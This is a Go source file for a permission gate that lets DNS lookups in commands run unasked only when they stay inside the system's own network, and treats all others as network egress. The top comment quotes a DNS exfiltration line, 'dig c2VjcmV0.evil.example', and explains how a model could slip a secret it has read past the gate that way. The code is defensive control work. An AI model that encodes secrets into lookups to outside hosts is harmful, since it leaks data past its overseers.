package servitor

// Where a lookup may go without asking.
//
// lookup_rule closes the shell's way of filling a lookup with data. It cannot
// close the model's own: a model that read a secret can type it into a
// literal name ("dig c2VjcmV0.evil.example"), and that line is a plain lookup.
// What gives it away is the destination, not the syntax: the name only reaches
// the attacker if the attacker runs the nameserver for it. So a lookup runs
// free only when everything it names is inside this system's own network, and
// asks as net_egress otherwise.
//
// Inside, with nothing configured: private, loopback and link-local
// addresses; a name with no dot (the resolver's search domains or the hosts
// file answer it); the names set aside for local use (.local, .internal, ...);
// and the domain of the system's own Host. The owner adds the rest, one entry
// per line: a domain (its subdomains come with it), an address, or a network.
// An empty list is the strict reading, not an open one.

import (
	"fmt"
	"net/netip"
	"regexp"
	"strings"
)

// lookup_scope is the set of destinations a lookup may reach without asking.
// A nil scope is the built-in set alone: a gate that was not told which system
// it stands on is stricter, never looser.
type lookup_scope struct {
	domains []string // lowercase, no leading or trailing dot
	nets    []netip.Prefix
}

// local_suffixes are names that never leave the local network or the
// organization's own resolvers: localhost, mDNS, and the private-use names.
var local_suffixes = []string{"localhost", "local", "localdomain", "internal", "lan", "home.arpa"}

// lookup_scope_for is the scope a command run on a is judged against.
func lookup_scope_for(a Appliance) *lookup_scope {
	return new_lookup_scope(a.Host, a.LookupAllow)
}

// new_lookup_scope builds a scope from the system's host and its owner's list.
// An entry that does not parse is left out, which narrows the scope rather
// than widening it; the save handler refuses such entries before they are
// stored (normalize_lookup_allow).
func new_lookup_scope(host string, entries []string) *lookup_scope {
	ls := &lookup_scope{}
	for _, e := range entries {
		if d, p, err := parse_lookup_entry(e); err == nil {
			ls.add(d, p)
		}
	}
	host = clean_lookup_name(host)
	if host == "" {
		return ls
	}
	if a, err := netip.ParseAddr(host); err == nil {
		ls.nets = append(ls.nets, netip.PrefixFrom(a.Unmap(), a.Unmap().BitLen()))
		return ls
	}
	ls.domains = append(ls.domains, host)
	if parent := own_parent_domain(host); parent != "" {
		ls.domains = append(ls.domains, parent)
	}
	return ls
}

func (ls *lookup_scope) add(domain string, p netip.Prefix) {
	if domain != "" {
		ls.domains = append(ls.domains, domain)
		return
	}
	ls.nets = append(ls.nets, p)
}

// country_second_levels are the labels a country registry sells names under
// ("co.uk", "com.au"). The parent of "web01.co.uk" is a registry, not an
// organization, so it is never taken as the system's own domain.
var country_second_levels = set_of("co", "com", "net", "org", "gov", "edu", "ac", "or", "ne", "go", "gob", "nic", "mil")

// own_parent_domain is the domain a host sits in ("web01.corp.example.com"
// -> "corp.example.com"), or "" when there is none worth trusting: a host
// with fewer than three labels, or one whose parent is a registry.
func own_parent_domain(host string) string {
	_, parent, ok := strings.Cut(host, ".")
	if !ok || !strings.Contains(parent, ".") {
		return ""
	}
	labels := strings.Split(parent, ".")
	if len(labels) == 2 && len(labels[1]) == 2 && country_second_levels[labels[0]] {
		return ""
	}
	return parent
}

// clean_lookup_name lowercases a name and drops the root dot.
func clean_lookup_name(s string) string {
	return strings.TrimSuffix(strings.ToLower(strings.TrimSpace(s)), ".")
}

var lookup_domain_re = regexp.MustCompile(`^[a-z0-9_]([a-z0-9_-]*[a-z0-9_])?(\.[a-z0-9_]([a-z0-9_-]*[a-z0-9_])?)+$`)

// parse_lookup_entry reads one line of an owner's list: a domain (returned
// lowercase, a leading "*." or "." dropped) or an address or network.
func parse_lookup_entry(s string) (string, netip.Prefix, error) {
	e := clean_lookup_name(s)
	e = strings.TrimPrefix(strings.TrimPrefix(e, "*."), ".")
	if e == "" {
		return "", netip.Prefix{}, fmt.Errorf("an entry is empty")
	}
	if strings.Contains(e, "/") {
		p, err := netip.ParsePrefix(e)
		if err != nil {
			return "", netip.Prefix{}, fmt.Errorf("%q is not a network (write it like 10.20.0.0/16)", s)
		}
		return "", p.Masked(), nil
	}
	if a, err := netip.ParseAddr(e); err == nil {
		a = a.Unmap()
		return "", netip.PrefixFrom(a, a.BitLen()), nil
	}
	if !strings.Contains(e, ".") {
		return "", netip.Prefix{}, fmt.Errorf("%q is a top-level domain, which would let lookups reach anyone under it: name the organization's domain", s)
	}
	if !lookup_domain_re.MatchString(e) {
		return "", netip.Prefix{}, fmt.Errorf("%q is not a domain, an address or a network", s)
	}
	return e, netip.Prefix{}, nil
}

// normalize_lookup_allow cleans an owner's list for storage, or says which
// entry is wrong. Duplicates and blank lines are dropped.
func normalize_lookup_allow(in []string) ([]string, error) {
	var out []string
	seen := map[string]bool{}
	for _, s := range in {
		if strings.TrimSpace(s) == "" {
			continue
		}
		d, p, err := parse_lookup_entry(s)
		if err != nil {
			return nil, err
		}
		v := d
		if v == "" {
			v = p.String()
			if p.IsSingleIP() {
				v = p.Addr().String()
			}
		}
		if !seen[v] {
			seen[v] = true
			out = append(out, v)
		}
	}
	return out, nil
}

// inside reports whether a lookup naming dest stays inside the scope. Safe on
// a nil scope.
func (ls *lookup_scope) inside(dest string) bool {
	d := clean_lookup_name(dest)
	if d == "" {
		return true // names nothing, so sends nothing
	}
	if a, err := netip.ParseAddr(d); err == nil {
		a = a.Unmap()
		if a.IsLoopback() || a.IsPrivate() || a.IsLinkLocalUnicast() || a.IsUnspecified() {
			return true
		}
		if ls != nil {
			for _, p := range ls.nets {
				if p.Contains(a.WithZone("")) {
					return true
				}
			}
		}
		return false
	}
	// "167772161", "0x0a.1": the resolver's old numeric spellings of an
	// address. Not worth decoding to vouch for; they read as outside.
	if strings.Trim(d, "0123456789.") == "" || strings.HasPrefix(d, "0x") {
		return false
	}
	if !strings.Contains(d, ".") {
		return true
	}
	for _, suf := range local_suffixes {
		if d == suf || strings.HasSuffix(d, "."+suf) {
			return true
		}
	}
	if ls == nil {
		return false
	}
	for _, dom := range ls.domains {
		if d == dom || strings.HasSuffix(d, "."+dom) {
			return true
		}
	}
	return false
}
